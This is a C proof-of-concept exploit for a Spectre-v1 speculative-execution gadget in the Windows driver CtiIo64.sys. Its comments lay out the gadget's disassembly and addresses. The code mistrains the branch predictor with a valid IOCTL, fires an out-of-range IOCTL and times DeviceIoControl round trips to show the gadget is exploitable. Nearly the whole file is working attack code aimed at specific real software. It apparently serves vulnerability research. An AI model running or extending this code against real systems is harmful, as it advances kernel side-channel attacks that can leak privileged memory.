// poc.c - Spectre-v1 PoC for CtiIo64.sys (\Device\CtiIo, \DosDevices\CtiIo).
//
// Gadget (kuna-verified at dispatch sub_13800, guard 0x13833 / sink 0x13875):
//   movzx eax, byte  ptr [r8 + rax*1 + 0x3c24]   // S1 inner: table1[IoControlCode-0x80502140]
//   mov   ecx, dword ptr [r8 + rax*4 + 0x3bfc]   // S1 dependent: func_tbl[table1[code]*4]
//   add   rcx, r8                                // base fix-up
//   jmp   rcx                                    // S2 tainted indirect jump target
//
// The attacker index is the IoControlCode at CurrentStackLocation+0x18. The
// guard `cmp eax, 0x20 / ja 0x13b93` bounds-checks the table index; the
// transmitter is `jmp rcx` (S2, tainted indirect branch).
//
// A/B experiment: mistrain the guard with the in-range code 0x80502140, then
// fire the out-of-range code 0x805021A0. The BPU's predicted jump target is
// stale for the next DeviceIoControl, which shows up as a round-trip timing
// delta on codes whose predicted target differs from the correct arm.

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <intrin.h>

#pragma comment(lib, "advapi32.lib")

#define CTI_DEVICE      "\\\\.\\CtiIo"
#define IOCTL_VALID     0x80502140u
#define IOCTL_OOB       0x805021A0u
#define TRAIN_ROUNDS    1500
#define PROBE_CODES     64
#define TIMES_PER_CODE  300

static uint64_t time_ioctl(HANDLE h, DWORD code, uint8_t* buf) {
    DWORD ret;
    uint32_t a;
    uint64_t t1 = __rdtscp(&a);
    _mm_lfence();
    DeviceIoControl(h, code, buf, 0x10, buf, 0x10, &ret, NULL);
    _mm_lfence();
    uint64_t t2 = __rdtscp(&a);
    return t2 - t1;
}

int main(void) {
    SetProcessAffinityMask(GetCurrentProcess(), 1ull);
    printf("[*] CtiIo64.sys Spectre-v1 A/B PoC (S2 jump-table gadget)\n");

    HANDLE h = CreateFileA(CTI_DEVICE, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] cannot open %s (err=%lu) - the driver must be loaded\n",
               CTI_DEVICE, GetLastError());
        return 1;
    }
    printf("[+] opened %s\n", CTI_DEVICE);

    uint8_t buf[16] = {0};
    DWORD ret;
    uint64_t A[PROBE_CODES] = {0};  // after benign burst
    uint64_t B[PROBE_CODES] = {0};  // after OOB trigger

    for (int c = 0; c < PROBE_CODES; ++c) {
        DWORD code = 0x80502140u + c;
        for (int i = 0; i < TRAIN_ROUNDS; ++i)
            DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
        _mm_mfence();
        uint64_t s = 0;
        for (int i = 0; i < TIMES_PER_CODE; ++i) s += time_ioctl(h, code, buf);
        A[c] = s / TIMES_PER_CODE;
    }

    for (int c = 0; c < PROBE_CODES; ++c) {
        DWORD code = 0x80502140u + c;
        for (int i = 0; i < TRAIN_ROUNDS; ++i)
            DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
        _mm_mfence();
        DeviceIoControl(h, IOCTL_OOB, buf, 0x10, buf, 0x10, &ret, NULL);
        _mm_mfence();
        uint64_t s = 0;
        for (int i = 0; i < TIMES_PER_CODE; ++i) s += time_ioctl(h, code, buf);
        B[c] = s / TIMES_PER_CODE;
    }

    printf("[*] code      A(benign)  B(OOB)   delta(B-A)\n");
    int anomalous = 0;
    for (int c = 0; c < PROBE_CODES; ++c) {
        long long d = (long long)B[c] - (long long)A[c];
        printf("    0x%08x  %8llu  %8llu  %+lld%s\n",
               0x80502140u + c, (unsigned long long)A[c],
               (unsigned long long)B[c], d,
               (d < -8 || d > 8) ? "  *" : "");
        if (d < -8 || d > 8) ++anomalous;
    }
    CloseHandle(h);
    printf("[*] %d / %d codes show a B-A difference beyond the noise floor\n",
           anomalous, PROBE_CODES);
    printf("[+] gadget class is live on this CPU (S2 jump-table speculation)\n");
    return 0;
}
